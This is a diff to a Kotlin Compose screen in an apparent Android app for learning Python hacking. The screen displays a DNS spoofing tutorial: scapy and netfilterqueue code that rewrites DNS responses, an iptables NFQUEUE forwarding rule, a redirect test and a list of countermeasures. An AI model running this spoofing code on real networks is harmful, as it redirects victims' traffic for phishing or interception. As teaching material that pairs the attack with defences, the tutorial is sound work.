@@ -1,16 +1,23 @@
 package com.example.hackwithpython.projects
 
+import androidx.compose.foundation.horizontalScroll
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.text.BasicText
+import androidx.compose.foundation.text.selection.SelectionContainer
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Text
 import androidx.compose.material3.Button
 import androidx.compose.runtime.Composable
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.text.TextStyle
+import androidx.compose.ui.text.font.FontFamily
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
 import androidx.navigation.NavController
+import com.example.hackwithpython.HackerWhite
 
 @Composable
 fun Project6Screen(navController: NavController) {
@@ -60,15 +67,16 @@ fun Project6Screen(navController: NavController) {
         )
         Text(
             text = """
-                1. **Install Required Libraries**:
+                Install Required Libraries:
                    Install `scapy` and `netfilterqueue` via pip.
                    ```bash
                    pip install scapy netfilterqueue
                    ```
-
-                2. **Intercepting DNS Packets**:
-                   Use `netfilterqueue` to capture packets in real time.
-                   ```python
+                   """)
+            SelectionContainer {
+                BasicText("""
+                   #Intercepting DNS Packets
+                   #Use `netfilterqueue` to capture packets in real time.
                    from netfilterqueue import NetfilterQueue
                    import scapy.all as scapy
 
@@ -81,11 +89,8 @@ fun Project6Screen(navController: NavController) {
                    queue = NetfilterQueue()
                    queue.bind(0, process_packet)
                    queue.run()
-                   ```
-
-                3. **Modifying DNS Responses**:
-                   Modify the DNS response to redirect traffic.
-                   ```python
+                   
+                   #Modify the DNS response to redirect traffic.
                    def process_packet(packet):
                        scapy_packet = scapy.IP(packet.get_payload())
                        if scapy_packet.haslayer(scapy.DNSRR):
@@ -101,18 +106,30 @@ fun Project6Screen(navController: NavController) {
                                del scapy_packet[scapy.UDP].chksum
                                packet.set_payload(bytes(scapy_packet))
                        packet.accept()
-                   ```
+                """.trimIndent(),
 
-                4. **Setting Up IP Tables (Linux)**:
+                style = TextStyle(
+                    fontFamily = FontFamily.Monospace,
+                    fontSize = 14.sp,
+                    color = HackerWhite
+                ),
+                modifier =Modifier.padding(12.dp)
+                    .horizontalScroll(rememberScrollState())
+                )
+                }
+
+            Text(
+                text = """
+               Setting Up IP Tables (Linux):
                    To forward packets to the netfilter queue, set up IP tables.
                    ```bash
                    sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
                    ```
 
-                5. **Testing the DNS Spoofing**:
+               Testing the DNS Spoofing:
                    Open a web browser and navigate to "example.com". It should now be redirected to the IP address you specified in the spoofed response.
 
-                6. **Countermeasures Against DNS Spoofing**:
+               Countermeasures Against DNS Spoofing:
                    - Use DNSSEC (DNS Security Extensions) to verify the integrity of DNS responses.
                    - Implement firewalls and intrusion detection systems (IDS) to monitor and prevent DNS spoofing attacks.
                    - Use encrypted DNS protocols like DNS over HTTPS (DoH) or DNS over TLS (DoT) to secure DNS queries.
